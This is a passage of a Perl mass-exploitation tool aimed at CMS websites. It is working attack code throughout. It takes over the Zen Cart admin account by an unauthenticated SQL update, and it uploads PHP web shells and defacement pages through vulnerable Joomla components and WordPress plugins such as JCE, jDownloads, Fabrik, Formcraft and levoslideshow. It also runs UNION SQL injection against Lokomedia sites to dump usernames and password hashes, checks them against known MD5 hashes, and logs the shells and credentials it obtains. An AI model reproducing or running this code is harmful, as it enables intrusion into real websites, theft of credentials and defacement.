print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold green'),"[VULN]\n\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>rez/drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold red'),"[FAILED]\n\n";
}
}

sub zencart {
$target = $site;
$target = "$site";
my $re = &exploit($target);

if ($re =~ /1 statements processed/i){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"ZEN CART Add Admin";
print color('bold green'),"[VULN]\n\n";
open (TEXT, '>>rez/zencart.txt');
print TEXT "\nURL : $target\n";
print TEXT "USER : admincrash\n";
print TEXT "PASS : wew\n";
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"ZEN CART Add Admin";
print color('bold red'),"[FAILED]\n\n";
}
}
sub exploit(){
$url = $_[0];
my $browser = LWP::UserAgent->new();
my $responde = HTTP::Request->new(POST => $url."/admin/sqlpatch.php/password_forgotten.php?action=execute");
$responde->content_type("application/x-www-form-urlencoded");
$responde->content("query_string=UPDATE admin SET admin_name='admincrash', admin_email='admin@shopadmin.com', admin_pass='617ec22fbb8f201c366e9848c0eb6925:87' WHERE admin_id='1';");
$browser->request($responde)->as_string
}

############# Com Jce
sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


my $jceurl="$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

my $res = $ua->post($jceurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["m.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$jceup= "$site/m.gif";
$check = $ua->get($jceup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jceup\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$jceup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold red'),"[FAILED]\n";
}
}
############## Com Media
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="mob.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/mob.txt";

$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/FUCK/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $mediaup\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold red'),"[FAILED]\n";
}
}

################ comjdownloads
sub comjdownloads(){
$file="this.rar";
$filez="l.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/l.php.j?X=M0B';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"M0B\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $shellpath\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold red'),"[FAILED]\n";
}
}
################ comjdownloads index
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/l.html.j';
$filee="one.zip";
$filezz="l.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"M0B\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $def\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
        }
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";

}
}
################ comfabrik
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="l.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/l.php?X=M0B";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikupp\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold red'),"[FAILED]\n";
  comjdownloadsdef();
}
}
################ comfabrik2
 sub comfabrik2(){
 my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
 my $shell ="l.php";
 
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["file" => ["$shell"]]
            
             );
 
 $comfabrikupp2="$site/l.php?X=M0B";
 
 $checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
 if($checkcomfabrikupp =~/M0B - Uname:/) {
 
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
 print color('bold green'),"[VULN]\n";
 print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Shell Uploaded Successfully\n";
 print color('bold white'),"  [Link] => $comfabrikupp2\n";
 open (TEXT, '>>rez/shells.txt');
 print TEXT "$comfabrikupp\n";
 close (TEXT);
 }else{
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
 print color('bold red'),"[FAILED]\n";
 }
 }
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/l.html.j';
$filee="one.zip";
$filezz="l.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"MOB\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $def\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
        }
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold red'),"[FAILED]\n";
}
}
################ comfabrik index
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="mob.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/mob.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comfabrikup\n";
open (TEXT, '>>rez/shells.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold red'),"[FAILED]\n";
}
}
################ foxcontact #####################
sub foxcontact(){

@foxvuln= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxvuln(@foxvuln){
chomp $foxvuln;

my $url = "$site/$foxvuln";

my $shell ="l.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?X=M0B";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $foxup\n";
open (TEXT, '>>rez/shells.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold red'),"[FAILED]\n";
}
}
################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["m.jpg"], name => "m.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/m.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/HACKED By/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold red'),"[FAILED]\n";
}
}
sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"TRY To exploit it , but it doesn't work all times :(\n";
    open(save, '>>rez/vulntargets.txt');   
    print save "[blog] $site\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold red'),"[FAILED]\n";
}
}

sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"TRY To exploit it , but it doesn't work all times :(\n";
    open(save, '>>rez/vulntargets.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Users";
print color('bold red'),"[FAILED]\n";
}
}
################ comweblinks
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="m.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/m.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold red'),"[FAILED]\n";
}
}
################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/l.php?X=M0B";

my $shell ="l.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simplefileuploadsup\n";
open (TEXT, '>>rez/shells.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold red'),"[FAILED]\n";
}
}

sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Username : $user\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : default\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : password\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : test\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
  print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"URL : $pathone\n";
open (TEXT, '>>rez/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n";
}
}

################ levoslideshow
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold white'),"";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"levoslideshow";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Formcraft
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/l.php?X=M0B";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $formcraftup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}
################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["l.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/l.php?X=M0B";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";

print color('bold white'),"";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $addblockup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";

print color('bold white'),"";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $blazeup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

